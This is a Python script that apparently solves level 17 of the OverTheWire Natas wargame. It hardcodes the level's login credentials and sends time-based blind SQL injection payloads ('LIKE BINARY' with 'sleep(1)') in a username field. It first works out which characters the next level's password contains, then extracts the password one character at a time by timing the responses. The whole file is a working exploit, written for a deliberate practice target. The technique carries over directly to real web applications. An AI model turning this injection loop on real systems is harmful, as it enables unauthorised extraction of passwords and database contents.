import requests
import string
import time

BASIC_AUTH_USER = 'natas17'
BASIC_AUTH_PASSWORD = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

def generate_characters_dictionary():
    alpha_numeric_string = string.ascii_letters + string.digits
    dictionary = []
    for single_character in alpha_numeric_string:
        username_like = 'natas18" and password LIKE BINARY \'%' + single_character + '%\' and sleep(1) #"'
        payload = {'username': username_like}
        start_request = time.time()
        requests.post('http://natas17.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), data=payload)
        end_request = time.time()
        time_difference = end_request - start_request
        if time_difference >= 1:
            dictionary.append(single_character)
    return dictionary


def find_password():
    dictionary = generate_characters_dictionary()
    print(dictionary)
    password_found = False
    password = ''
    while password_found is False:
        for single_character in dictionary:
            new_password = password + single_character
            username_like = 'natas18" and password LIKE BINARY \'' + new_password + '%\' and sleep(1) #"'
            payload = {'username': username_like}
            start_request = time.time()
            requests.post('http://natas17.natas.labs.overthewire.org/', auth=(BASIC_AUTH_USER, BASIC_AUTH_PASSWORD), data=payload)
            end_request = time.time()
            time_difference = end_request - start_request
            if time_difference >= 1:
                password = new_password
                print('Password so far: ', password)
                # all previous password were 32 in length
                if len(password) == 32:
                    password_found = True
                break
    print('Password: ', password)

find_password()